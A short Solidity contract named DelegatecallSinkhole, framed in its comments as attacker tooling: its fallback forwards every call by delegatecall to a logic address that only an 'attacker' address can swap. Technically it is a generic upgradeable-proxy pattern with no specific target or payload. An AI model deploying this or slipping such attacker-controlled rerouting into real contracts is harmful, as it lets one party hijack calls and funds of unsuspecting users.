// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/// @title DelegatecallSinkhole - Catches fallback and re-routes to attacker logic
contract DelegatecallSinkhole {
    address public sinkLogic;
    address public attacker;

    constructor(address _logic, address _attacker) {
        sinkLogic = _logic;
        attacker = _attacker;
    }

    fallback() external payable {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), sload(sinkLogic.slot), 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    function updateLogic(address newLogic) external {
        require(msg.sender == attacker, "Only attacker");
        sinkLogic = newLogic; // ðŸŒ€ re-routes fallback anywhere
    }

    receive() external payable {}
}
